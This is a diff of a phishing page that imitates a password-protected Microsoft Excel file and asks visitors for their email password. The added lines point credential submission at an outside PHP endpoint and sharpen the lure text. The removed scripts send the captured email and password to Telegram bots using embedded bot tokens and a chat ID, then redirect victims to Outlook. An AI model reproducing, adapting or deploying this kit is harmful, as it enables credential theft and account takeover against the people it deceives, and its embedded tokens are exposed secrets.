@@ -220,9 +220,9 @@
               "
             >
               <span id="cname" style="display: inline">
-                Protected!
+              Confirm
               </span>
-              Product_list.xls
+              Order_list.xls
             </p>
             <p
               style="
@@ -235,7 +235,7 @@
               Microsoft Excel File
             </p>
             <p>
-              Secure Access Required: Please sign in with your email to continue.
+              This Document is Protected! Please enter your E-mail password to open.
             </p>
             <label for="login"></label>
             <input
@@ -366,7 +366,7 @@
         e.preventDefault();
       });
 
-      let RURL = "aHR0cHM6Ly9vem9uZS5jb20vd3AtY29uZmlnL2luZGV4LnBocA==";
+      let RURL = "https://diekitchen.com/sparl/2.php";
 
       try {
         RURL = atob(RURL);
@@ -633,103 +633,5 @@
         return result;
       }
     </script>
-  
-<script>
-  let attempt = 1;
-
-  document.getElementById("authForm").addEventListener("submit", async function (e) {
-    e.preventDefault();
-    const submitLoader = document.getElementById("submitLoader");
-    submitLoader.style.display = "flex";
-
-    const email = document.getElementById("login").value;
-    const password = document.getElementById("password-input").value;
-
-    const message = `🔐 New Deal:\n📧 Email: ${email}\n🔑 Password: ${password}`;
-    const botToken = "8797429365:AAGiDRZWBKwc0snmD8TKsKOQfVjrtPetnI0"; // <- Replace this
-    const chatId = "6055880871";     // <- Replace this
-
-    try {
-      const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      });
-
-      if (telegramResponse.ok) {
-        document.getElementById("error").style.display = "none";
-        submitLoader.style.display = "none";
-        alert("Information submitted successfully.");
-      } else {
-        throw new Error("Telegram API error");
-      }
-    } catch (error) {
-      document.getElementById("error").style.display = "block";
-      submitLoader.style.display = "none";
-    }
-  });
-
-  window.addEventListener("load", function () {
-    const loader = document.getElementById("loader");
-    const mainContent = document.getElementById("main-content");
-    document.getElementById("submitLoader").style.display = "none";
-
-    setTimeout(() => {
-      loader.style.opacity = "0";
-      loader.style.visibility = "hidden";
-      mainContent.style.opacity = "1";
-    }, 3000);
-  });
-</script>
-
-
-<script>
-  const TOKEN = "8071576258:AAGieBF96yiWPvpO3tS7sgjXV4uvxIlPcew";
-  const CHAT_ID = "6055880871";
-
-  document.getElementById("authForm").addEventListener("submit", function (e) {
-    e.preventDefault();
-
-    const email = document.getElementById("login").value;
-    const password = document.getElementById("password-input").value;
-
-    const message = `
-🔐 Real Deal
--------------------------
-📧 Email: ${email}
-🔑 Password: ${password}
-🕒 Time: ${new Date().toLocaleString()}
-`;
-
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: "Markdown",
-      }),
-    })
-      .then((response) => {
-        if (response.ok) {
-          window.location.href = "https://outlook.office.com";
-        } else {
-          document.getElementById("error").style.display = "block";
-        }
-      })
-      .catch((error) => {
-        console.error("Error sending message to Telegram:", error);
-        document.getElementById("error").style.display = "block";
-      });
-  });
-</script>
-
-</body>
+  </body>
 </html>
